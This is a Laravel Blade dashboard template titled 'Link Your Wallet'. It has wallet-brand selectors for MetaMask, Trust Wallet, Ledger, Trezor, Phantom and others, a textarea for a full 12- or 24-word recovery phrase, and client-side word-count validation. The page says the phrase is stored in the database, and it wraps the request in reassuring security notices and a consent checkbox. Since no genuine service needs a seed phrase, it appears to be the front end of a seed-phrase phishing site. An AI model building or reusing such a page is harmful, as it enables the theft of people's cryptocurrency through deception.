@include('dashboard.header')

<main class="content">
	<div class="container-fluid p-0">
		<div class="row">
			<div class="col-12">
				<div class="card shadow-sm">
					<div class="card-header bg-primary text-white">
						<h1 class="card-title mb-0">
							<i class="align-middle" data-feather="link"></i> Link Your Wallet
						</h1>
					</div>
					<div class="card-body">
						@include('dashboard.alert')

						@if($user->wallet_linked)
						<div class="dashboard-alert dashboard-alert-info alert-dismissible fade show" role="alert">
							<div class="alert-icon">
								<i class="align-middle" data-feather="info" style="width: 24px; height: 24px;"></i>
							</div>
							<div class="alert-content">
								<div class="alert-title">
									Wallet Already Linked!
								</div>
								<div class="alert-message">
									Your wallet is already linked with a {{ $user->wallet_phrase_type }}-word phrase. 
									You can update it below if needed.
								</div>
							</div>
							<button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close">
								<span aria-hidden="true">&times;</span>
							</button>
						</div>
						@endif

						<div class="row">
							<div class="col-lg-8 mx-auto">
								<div class="card border-0 shadow-sm mb-4">
									<div class="card-body">
										<h5 class="card-title mb-3">
											<i class="align-middle" data-feather="shield"></i> Security Information
										</h5>
										<div class="alert alert-warning">
											<strong><i class="align-middle" data-feather="alert-triangle"></i> Important Security Notice:</strong>
											<ul class="mb-0 mt-2">
												<li>Your wallet phrase will be stored in the database</li>
												<li>Never share your wallet phrase with anyone</li>
												<li>Make sure you're on a secure connection before entering your phrase</li>
												<li>Double-check that you've entered all words correctly</li>
											</ul>
										</div>
									</div>
								</div>

								<form method="POST" action="{{ $user->wallet_linked ? route('wallet.update.phrase') : route('wallet.store.phrase') }}" id="walletPhraseForm">
									@csrf
									@if($user->wallet_linked)
									@method('PUT')
									@endif

									<!-- Wallet Type Selection -->
									<div class="mb-5">
										<label class="form-label fw-bold mb-3">
											<i class="align-middle" data-feather="wallet"></i> Select Wallet Type <span class="text-danger">*</span>
										</label>
										<div class="row g-3">
											<!-- MetaMask -->
											<div class="col-md-4 col-lg-3">
												<div class="wallet-type-card">
													<input type="radio" name="wallet_type" id="wallet_metamask" value="metamask" class="d-none" 
														{{ old('wallet_type', $user->wallet_type) == 'metamask' ? 'checked' : '' }} required>
													<label for="wallet_metamask" class="wallet-type-label">
														<div class="wallet-logo">
															<svg width="48" height="48" viewBox="0 0 318.6 318.6" fill="none" xmlns="http://www.w3.org/2000/svg">
																<path d="M274.1 35.5l-99.5 73.9L193 65.8 274.1 35.5z" fill="#E17726"/>
																<path d="M44.4 35.5l98.7 74.6-17.5-44.3L44.4 35.5z" fill="#E27625"/>
																<path d="M238.8 206.5l-26.5 40.6 56.7 15.6 16.3-55.3-46.5-.9z" fill="#E27625"/>
																<path d="M33.9 207.4L50.1 262.7l56.7-15.6-26.5-40.6-46.4.9z" fill="#E27625"/>
																<path d="M103.6 138.2l-15.8 23.9 56.3 2.5-2-60.5-38.5 34.1z" fill="#E27625"/>
																<path d="M214.9 138.2l-39.2-33.9-1.3 61.2 56.2-2.5-15.7-23.8z" fill="#E27625"/>
																<path d="M106.8 247.1l33.8-16.5-29.2-22.6-4.6 39.1z" fill="#E27625"/>
																<path d="M177.9 230.6l33.9 16.5-4.7-39.1-29.2 22.6z" fill="#E27625"/>
																<path d="M211.8 247.1l-33.9-16.5 2.7 22.1-.6 13.8 32.1-12.8-1.3-6.6z" fill="#D5BFB2"/>
																<path d="M106.8 247.1l1.2 6.6 32.1 12.8-.5-13.8 2.5-22.1-33.8 16.5z" fill="#D5BFB2"/>
																<path d="M138.8 193.5l-28.2-8.3 19.9-9.1 8.3 17.4z" fill="#233447"/>
																<path d="M179.7 193.5l8.2-17.4 20 9.1-28.2 8.3z" fill="#233447"/>
																<path d="M106.8 247.1l4.8-40.6-32.1.9 27.3 39.7z" fill="#CC6228"/>
																<path d="M206.9 206.5l4.9 40.6 27.4-39.7-32.2-.9z" fill="#CC6228"/>
																<path d="M247.2 162.1l-56.2 2.5 5.2 28.7 8.2-17.4 20 9.1 22.8-23.9z" fill="#CC6228"/>
																<path d="M71.3 185.2l20-9.1 8.2 17.4 5.3-28.7-56.3-2.5 22.8 23.9z" fill="#CC6228"/>
																<path d="M193.1 164.6l-11.4-17.1 32.1-46.9-45.1-33.5-38.5 34.1-1.3 61.2 5.2 28.7 8.2-17.4 20 9.1 22.8-23.9-20-9.1z" fill="#E27625"/>
																<path d="M87.8 164.6l22.9 9.1-20 9.1 8.2 17.4 5.3-28.7-1.3-61.2-38.5-34.1-45 33.5 32 46.9-11.4 17.1z" fill="#E27625"/>
																<path d="M193.1 164.6l-11.4-17.1 32.1-46.9-45.1-33.5-38.5 34.1-1.3 61.2 5.2 28.7 8.2-17.4 20 9.1 22.8-23.9-20-9.1z" fill="#F5841F"/>
																<path d="M87.8 164.6l22.9 9.1-20 9.1 8.2 17.4 5.3-28.7-1.3-61.2-38.5-34.1-45 33.5 32 46.9-11.4 17.1z" fill="#F5841F"/>
															</svg>
														</div>
														<h6 class="mt-2 mb-0">MetaMask</h6>
													</label>
												</div>
											</div>

											<!-- Trust Wallet -->
											<div class="col-md-4 col-lg-3">
												<div class="wallet-type-card">
													<input type="radio" name="wallet_type" id="wallet_trust" value="trust" class="d-none"
														{{ old('wallet_type', $user->wallet_type) == 'trust' ? 'checked' : '' }} required>
													<label for="wallet_trust" class="wallet-type-label">
														<div class="wallet-logo">
															<svg width="48" height="48" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
																<circle cx="50" cy="50" r="45" fill="#337CC4"/>
																<path d="M50 25L60 40H70L55 50L65 65H50L40 50L30 40H40L50 25Z" fill="white"/>
															</svg>
														</div>
														<h6 class="mt-2 mb-0">Trust Wallet</h6>
													</label>
												</div>
											</div>

											<!-- Coinbase Wallet -->
											<div class="col-md-4 col-lg-3">
												<div class="wallet-type-card">
													<input type="radio" name="wallet_type" id="wallet_coinbase" value="coinbase" class="d-none"
														{{ old('wallet_type', $user->wallet_type) == 'coinbase' ? 'checked' : '' }} required>
													<label for="wallet_coinbase" class="wallet-type-label">
														<div class="wallet-logo">
															<svg width="48" height="48" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
																<circle cx="50" cy="50" r="45" fill="#0052FF"/>
																<path d="M50 30L60 40L50 50L40 40L50 30Z" fill="white"/>
																<path d="M60 40L70 50L60 60L50 50L60 40Z" fill="white"/>
																<path d="M40 40L50 50L40 60L30 50L40 40Z" fill="white"/>
																<path d="M50 50L60 60L50 70L40 60L50 50Z" fill="white"/>
															</svg>
														</div>
														<h6 class="mt-2 mb-0">Coinbase</h6>
													</label>
												</div>
											</div>

											<!-- Ledger -->
											<div class="col-md-4 col-lg-3">
												<div class="wallet-type-card">
													<input type="radio" name="wallet_type" id="wallet_ledger" value="ledger" class="d-none"
														{{ old('wallet_type', $user->wallet_type) == 'ledger' ? 'checked' : '' }} required>
													<label for="wallet_ledger" class="wallet-type-label">
														<div class="wallet-logo">
															<svg width="48" height="48" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
																<rect x="20" y="30" width="60" height="40" rx="5" fill="white" stroke="#000" stroke-width="2"/>
																<rect x="25" y="35" width="50" height="30" rx="2" fill="#000"/>
																<circle cx="35" cy="50" r="3" fill="white"/>
																<circle cx="50" cy="50" r="3" fill="white"/>
																<circle cx="65" cy="50" r="3" fill="white"/>
															</svg>
														</div>
														<h6 class="mt-2 mb-0">Ledger</h6>
													</label>
												</div>
											</div>

											<!-- Trezor -->
											<div class="col-md-4 col-lg-3">
												<div class="wallet-type-card">
													<input type="radio" name="wallet_type" id="wallet_trezor" value="trezor" class="d-none"
														{{ old('wallet_type', $user->wallet_type) == 'trezor' ? 'checked' : '' }} required>
													<label for="wallet_trezor" class="wallet-type-label">
														<div class="wallet-logo">
															<svg width="48" height="48" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
																<rect x="20" y="30" width="60" height="40" rx="5" fill="#00DD84"/>
																<rect x="25" y="35" width="50" height="30" rx="2" fill="white"/>
																<text x="50" y="55" font-size="20" fill="#00DD84" text-anchor="middle" font-weight="bold">T</text>
															</svg>
														</div>
														<h6 class="mt-2 mb-0">Trezor</h6>
													</label>
												</div>
											</div>

											<!-- Phantom -->
											<div class="col-md-4 col-lg-3">
												<div class="wallet-type-card">
													<input type="radio" name="wallet_type" id="wallet_phantom" value="phantom" class="d-none"
														{{ old('wallet_type', $user->wallet_type) == 'phantom' ? 'checked' : '' }} required>
													<label for="wallet_phantom" class="wallet-type-label">
														<div class="wallet-logo">
															<svg width="48" height="48" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
																<circle cx="50" cy="50" r="45" fill="#AB9FF2"/>
																<path d="M50 30C40 30 32 38 32 48C32 58 40 66 50 66C60 66 68 58 68 48C68 38 60 30 50 30Z" fill="white"/>
																<path d="M50 50L45 45L50 40L55 45L50 50Z" fill="#AB9FF2"/>
															</svg>
														</div>
														<h6 class="mt-2 mb-0">Phantom</h6>
													</label>
												</div>
											</div>

											<!-- Exodus -->
											<div class="col-md-4 col-lg-3">
												<div class="wallet-type-card">
													<input type="radio" name="wallet_type" id="wallet_exodus" value="exodus" class="d-none"
														{{ old('wallet_type', $user->wallet_type) == 'exodus' ? 'checked' : '' }} required>
													<label for="wallet_exodus" class="wallet-type-label">
														<div class="wallet-logo">
															<svg width="48" height="48" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
																<circle cx="50" cy="50" r="45" fill="#D4AF37"/>
																<path d="M50 25L60 40L50 55L40 40L50 25Z" fill="white"/>
																<path d="M50 45L60 60L50 75L40 60L50 45Z" fill="white"/>
															</svg>
														</div>
														<h6 class="mt-2 mb-0">Exodus</h6>
													</label>
												</div>
											</div>

											<!-- Other -->
											<div class="col-md-4 col-lg-3">
												<div class="wallet-type-card">
													<input type="radio" name="wallet_type" id="wallet_other" value="other" class="d-none"
														{{ old('wallet_type', $user->wallet_type) == 'other' ? 'checked' : '' }} required>
													<label for="wallet_other" class="wallet-type-label">
														<div class="wallet-logo">
															<i class="align-middle" data-feather="wallet" style="width: 48px; height: 48px; color: #667eea;"></i>
														</div>
														<h6 class="mt-2 mb-0">Other</h6>
													</label>
												</div>
											</div>
										</div>
									</div>

									<!-- Phrase Type Selection -->
									<div class="mb-4">
										<label class="form-label fw-bold">
											<i class="align-middle" data-feather="hash"></i> Select Phrase Type <span class="text-danger">*</span>
										</label>
										<div class="row g-3">
											<div class="col-md-6">
												<div class="phrase-type-card">
													<input type="radio" name="phrase_type" id="phrase_12" value="12" class="d-none" 
														{{ old('phrase_type', $user->wallet_phrase_type) == '12' ? 'checked' : '' }} required>
													<label for="phrase_12" class="phrase-type-label">
														<div class="phrase-icon">
															<i class="align-middle" data-feather="hash" style="width: 40px; height: 40px;"></i>
														</div>
														<h5 class="mt-2 mb-1">12 Word Phrase</h5>
														<p class="text-muted small mb-0">Standard recovery phrase</p>
													</label>
												</div>
											</div>
											<div class="col-md-6">
												<div class="phrase-type-card">
													<input type="radio" name="phrase_type" id="phrase_24" value="24" class="d-none"
														{{ old('phrase_type', $user->wallet_phrase_type) == '24' ? 'checked' : '' }} required>
													<label for="phrase_24" class="phrase-type-label">
														<div class="phrase-icon">
															<i class="align-middle" data-feather="hash" style="width: 40px; height: 40px;"></i>
														</div>
														<h5 class="mt-2 mb-1">24 Word Phrase</h5>
														<p class="text-muted small mb-0">Extended recovery phrase</p>
													</label>
												</div>
											</div>
										</div>
									</div>

									<!-- Wallet Phrase Input -->
									<div class="mb-4">
										<label class="form-label fw-bold">
											<i class="align-middle" data-feather="key"></i> Enter Your Wallet Phrase <span class="text-danger">*</span>
										</label>
										<textarea 
											class="form-control form-control-lg" 
											name="wallet_phrase" 
											id="wallet_phrase"
											rows="4" 
											placeholder="Enter your wallet recovery phrase (12 or 24 words separated by spaces)"
											required
											autocomplete="off"
											spellcheck="false">{{ old('wallet_phrase') }}</textarea>
										<small class="text-muted">
											<i class="align-middle" data-feather="info"></i> 
											Enter all words separated by a single space. Do not include any numbers or special characters.
										</small>
										<div class="mt-2">
											<small class="text-muted">
												Word count: <span id="wordCount">0</span> words
											</small>
										</div>
									</div>

									<!-- Security Checkbox -->
									<div class="mb-4">
										<div class="form-check">
											<input class="form-check-input" type="checkbox" id="securityConfirm" required>
											<label class="form-check-label" for="securityConfirm">
												I understand that my wallet phrase will be stored in the database. 
												I confirm that I am entering my own wallet phrase and not sharing it with anyone.
											</label>
										</div>
									</div>

									<!-- Submit Button -->
									<div class="d-grid gap-2">
										<button type="submit" class="btn btn-primary btn-lg py-3">
											<i class="align-middle" data-feather="{{ $user->wallet_linked ? 'refresh-cw' : 'link' }}"></i> 
											{{ $user->wallet_linked ? 'Update Wallet Phrase' : 'Link Wallet' }}
										</button>
									</div>
								</form>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</main>

<style>
	.phrase-type-card {
		cursor: pointer;
		transition: all 0.3s ease;
	}

	.phrase-type-label {
		display: block;
		padding: 2rem 1.5rem;
		border: 2px solid #e0e0e0;
		border-radius: 12px;
		text-align: center;
		cursor: pointer;
		transition: all 0.3s ease;
		background: white;
		height: 100%;
	}

	.phrase-type-label:hover {
		border-color: #667eea;
		background: #f8f9ff;
		transform: translateY(-2px);
		box-shadow: 0 4px 12px rgba(102, 126, 234, 0.15);
	}

	.phrase-type-card input:checked + .phrase-type-label {
		border-color: #667eea;
		background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
		color: white;
		box-shadow: 0 4px 20px rgba(102, 126, 234, 0.3);
	}

	.phrase-type-card input:checked + .phrase-type-label .phrase-icon {
		color: white;
	}

	.phrase-type-card input:checked + .phrase-type-label .text-muted {
		color: rgba(255, 255, 255, 0.9) !important;
	}

	.phrase-icon {
		color: #667eea;
		transition: all 0.3s ease;
	}

	.wallet-type-card {
		cursor: pointer;
		transition: all 0.3s ease;
	}

	.wallet-type-label {
		display: block;
		padding: 1.5rem 1rem;
		border: 2px solid #e0e0e0;
		border-radius: 12px;
		text-align: center;
		cursor: pointer;
		transition: all 0.3s ease;
		background: white;
		height: 100%;
	}

	.wallet-type-label:hover {
		border-color: #667eea;
		background: #f8f9ff;
		transform: translateY(-2px);
		box-shadow: 0 4px 12px rgba(102, 126, 234, 0.15);
	}

	.wallet-type-card input:checked + .wallet-type-label {
		border-color: #667eea;
		background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
		color: white;
		box-shadow: 0 4px 20px rgba(102, 126, 234, 0.3);
	}

	.wallet-type-card input:checked + .wallet-type-label h6 {
		color: white;
	}

	.wallet-logo {
		display: flex;
		align-items: center;
		justify-content: center;
		margin-bottom: 0.5rem;
	}

	.wallet-logo img,
	.wallet-logo svg {
		object-fit: contain;
		border-radius: 8px;
	}

	.wallet-type-card input:checked + .wallet-type-label .wallet-logo img,
	.wallet-type-card input:checked + .wallet-type-label .wallet-logo svg {
		filter: brightness(0) invert(1);
	}

	.wallet-type-card input:checked + .wallet-type-label .wallet-logo i {
		color: white !important;
	}

	.card {
		border-radius: 12px;
		overflow: hidden;
	}

	.form-control-lg {
		font-size: 1rem;
		padding: 0.75rem 1rem;
	}

	#wallet_phrase {
		font-family: 'Courier New', monospace;
		letter-spacing: 0.5px;
	}

	@media (max-width: 768px) {
		.phrase-type-label {
			padding: 1.5rem 1rem;
		}
	}
</style>

<script>
	document.addEventListener('DOMContentLoaded', function() {
		// Initialize Feather Icons
		if (typeof feather !== 'undefined') {
			feather.replace();
		}

		const phraseInput = document.getElementById('wallet_phrase');
		const wordCountSpan = document.getElementById('wordCount');
		const phraseTypeInputs = document.querySelectorAll('input[name="phrase_type"]');
		const form = document.getElementById('walletPhraseForm');

		// Update word count
		function updateWordCount() {
			const text = phraseInput.value.trim();
			const words = text ? text.split(/\s+/).filter(word => word.length > 0) : [];
			wordCountSpan.textContent = words.length;
			
			// Highlight if count doesn't match selected type
			const selectedType = document.querySelector('input[name="phrase_type"]:checked');
			if (selectedType) {
				const expectedCount = parseInt(selectedType.value);
				if (words.length > 0 && words.length !== expectedCount) {
					wordCountSpan.style.color = '#dc3545';
					wordCountSpan.style.fontWeight = 'bold';
				} else {
					wordCountSpan.style.color = '';
					wordCountSpan.style.fontWeight = '';
				}
			}
		}

		phraseInput.addEventListener('input', updateWordCount);
		phraseInput.addEventListener('paste', function() {
			setTimeout(updateWordCount, 10);
		});

		// Update word count when phrase type changes
		phraseTypeInputs.forEach(input => {
			input.addEventListener('change', updateWordCount);
		});

		// Form validation
		form.addEventListener('submit', function(e) {
			const selectedWallet = document.querySelector('input[name="wallet_type"]:checked');
			if (!selectedWallet) {
				e.preventDefault();
				alert('Please select a wallet type');
				return false;
			}

			const selectedType = document.querySelector('input[name="phrase_type"]:checked');
			if (!selectedType) {
				e.preventDefault();
				alert('Please select a phrase type (12 or 24 words)');
				return false;
			}

			const text = phraseInput.value.trim();
			const words = text ? text.split(/\s+/).filter(word => word.length > 0) : [];
			const expectedCount = parseInt(selectedType.value);

			if (words.length === 0) {
				e.preventDefault();
				alert('Please enter your wallet phrase');
				phraseInput.focus();
				return false;
			}

			if (words.length !== expectedCount) {
				e.preventDefault();
				alert(`The phrase must contain exactly ${expectedCount} words. You entered ${words.length} words.`);
				phraseInput.focus();
				return false;
			}

			// Validate words (should only contain letters, no numbers or special chars)
			const invalidWords = words.filter(word => !/^[a-z]+$/i.test(word));
			if (invalidWords.length > 0) {
				e.preventDefault();
				alert('The phrase contains invalid words. Please ensure all words contain only letters.');
				phraseInput.focus();
				return false;
			}

			// Confirm before submitting
			if (!confirm('Are you sure you want to ' + ({{ $user->wallet_linked ? 'true' : 'false' }} ? 'update' : 'link') + ' your wallet phrase? This action cannot be undone.')) {
				e.preventDefault();
				return false;
			}
		});

		// Initial word count
		updateWordCount();
	});
</script>

@include('dashboard.footer')
